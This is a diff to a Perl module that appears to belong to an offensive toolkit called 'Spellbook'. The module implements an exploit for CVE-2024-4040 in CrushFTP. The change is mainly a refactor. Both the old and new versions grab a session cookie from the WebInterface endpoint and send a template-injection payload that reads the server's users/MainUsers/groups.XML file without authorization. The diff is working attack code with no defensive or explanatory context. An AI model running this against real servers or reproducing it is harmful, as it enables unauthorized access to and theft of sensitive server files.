@@ -6,8 +6,9 @@ package Spellbook::Advisory::CVE_2024_4040 {
     use HTTP::Cookies;
 
     sub new {
-        my ($class, $parameters) = @_;
-        my ($target, $help, @results);
+        my ($self, $parameters) = @_;
+        my ($target, $help, @result);
+
         my $payload = "users/MainUsers/groups.XML";
 
         Getopt::Long::GetOptionsFromArray (
@@ -21,26 +22,30 @@ package Spellbook::Advisory::CVE_2024_4040 {
             if ($target !~ /^http(s)?:\/\//) {
                 $target = "https://$target";
             }
-
-            my $userAgent = Spellbook::Core::UserAgent -> new;
-
-            my $cookie_jar = HTTP::Cookies -> new;
+            
+            my $endpoint   = "$target/WebInterface/";
+            my $userAgent  = Spellbook::Core::UserAgent -> new();
+            my $cookie_jar = HTTP::Cookies -> new();
+            
             $userAgent -> cookie_jar($cookie_jar);
-            my $endpoint = "$target/WebInterface/";
+            
             my $response = $userAgent -> post($endpoint);
+
             $cookie_jar -> extract_cookies($response);
-            $cookie_jar -> save;
+            $cookie_jar -> save();
+
             my $cookies = $response -> header("Set-Cookie");
 
-            if ($cookies =~ /currentAuth=([^;]+)/) {
-                my $currentAuth = $1;
-                my $data = "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$currentAuth";
-                my $content_type = 'application/x-www-form-urlencoded';
-                $response = $userAgent -> post($endpoint, Content_Type => $content_type, Content => $data);
-                push @results, $response -> decoded_content;
+            if ($cookies =~ /currentAuth=([^;]+)/) {                
+                $response = $userAgent -> post($endpoint, 
+                    Content_Type => "application/x-www-form-urlencoded", 
+                    Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
+                );
+                
+                push @result, $response -> decoded_content();
             }
 
-            return @results;
+            return @result;
         }
 
         if ($help) {
